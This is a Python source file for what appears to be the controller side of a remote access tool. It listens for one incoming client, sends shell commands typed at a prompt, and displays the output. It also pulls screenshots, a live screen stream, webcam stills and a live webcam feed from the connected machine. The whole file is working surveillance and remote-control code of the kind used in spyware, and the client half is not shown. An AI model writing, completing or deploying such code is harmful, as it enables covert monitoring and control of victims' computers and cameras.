import socket
import cv2
import numpy as np
from PIL import Image
import threading

class Server:
    def __init__(self, host="0.0.0.0", port=9000):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((host, port))
        self.s.listen(1)

        # print("Waiting for connection...")
        print("""
====================================
         SERVER STARTING
====================================
   Initializing services...
   Waiting for connections...
====================================
""")
        self.client, self.addr = self.s.accept()
        self.client.settimeout(30)

        print("Connected to", self.addr)

    def receive_all(self, size):
        data = b""
        try:
            while len(data) < size:
                packet = self.client.recv(min(4096, size - len(data)))
                if not packet:
                    return None
                data += packet
            return data
        except (socket.timeout, ConnectionResetError, OSError):
            return None

    def send_command(self, cmd):
        self.client.sendall(len(cmd).to_bytes(8, 'big'))
        self.client.sendall(cmd.encode())

    def handle_screenshot(self):
        size_bytes = self.receive_all(8)
        if size_bytes is None:
            print("Connection lost")
            return

        size = int.from_bytes(size_bytes, 'big')
        img_bytes = self.receive_all(size)

        if img_bytes is None:
            print("Connection lost")
            return

        img_array = np.frombuffer(img_bytes, dtype=np.uint8)
        img = cv2.imdecode(img_array, cv2.IMREAD_COLOR)

        cv2.imwrite("screenshot.jpg", img)
        print("Screenshot saved!")
        img = Image.open("screenshot.jpg")
        img.show()


    def handle_screenstream(self):
        self.client.settimeout(None)  # IMPORTANT
        while True:
            data_size = self.receive_all(8)
            if not data_size:
                print("Failed to get img size")
                break
            size = int.from_bytes(data_size,'big')

            data = self.receive_all(size)
            if not data:
                print("Failed to fetch img bytes")
                break

            data_array = np.frombuffer(data , dtype=np.uint8)
            img = cv2.imdecode(data_array, cv2.IMREAD_COLOR)
            if img is None:
                print("Failed to decode img")
                continue

            cv2.imshow('screenshare', img)
            # press ESC to stop
            if cv2.waitKey(1) == 27:
                break

        cv2.destroyAllWindows()


    def handle_webcapture(self):
        size_bytes = self.receive_all(8)
        if not size_bytes:
            print("Failed to fetch size")
            return

        size = int.from_bytes(size_bytes, 'big')
        data_bytes = self.receive_all(size)

        frame = np.frombuffer(data_bytes, dtype=np.uint8)
        img = cv2.imdecode(frame, cv2.IMREAD_COLOR)

        cv2.imwrite("webcapture.jpg", img)
        print("webcapture saved!")
    
    def handle_webstream(self):
        self.client.settimeout(None)  # IMPORTANT
        while True:
            data_size = self.receive_all(8)
            if not data_size:
                print("Failed to fetch data size...")
                break

            size = int.from_bytes(data_size,'big')
            data = self.receive_all(size)
            if not data:
                print("Failed to fetch image data...")
                break
            data_array = np.frombuffer(data , dtype=np.uint8)
            img = cv2.imdecode(data_array, cv2.IMREAD_COLOR)

            if img is None:
                print("Failed to decode image...")
                continue

            cv2.imshow('webstreame', img)

            #press esc to close
            if cv2.waitKey(1) == 27:
                running = False
                break
        
        cv2.destroyAllWindows()
        # wait for ENDSTREAM marker
        marker = self.receive_all(len(b'ENDSTREAM'))

        if marker == b'ENDSTREAM':
            print("Stream ended cleanly")
        else:
            print("Stream ended unexpectedly")



        

    def handle_output(self):
        size_bytes = self.receive_all(8)
        if not size_bytes:
            print("Size bytes not received")
            return

        size = int.from_bytes(size_bytes, 'big')
        output = self.receive_all(size)

        if output:
            print(output.decode("utf-8", errors="replace"))

    def run(self):
        while True:
            cmd = input("$ ").strip()
            if not cmd:
                continue

            self.send_command(cmd)

            if cmd.lower() == "exit":
                break
            elif cmd.lower() == "screenshot":
                self.handle_screenshot()
            elif cmd.lower() == "screenstream":
                self.handle_screenstream()
                # print("Currently working in this command...")
            elif cmd.lower() == "webcapture":
                self.handle_webcapture()
            elif cmd.lower() == "webstream":
                threading.Thread(target=self.handle_webstream, daemon=True).start()
            else:
                self.handle_output()

        self.client.close()
        self.s.close()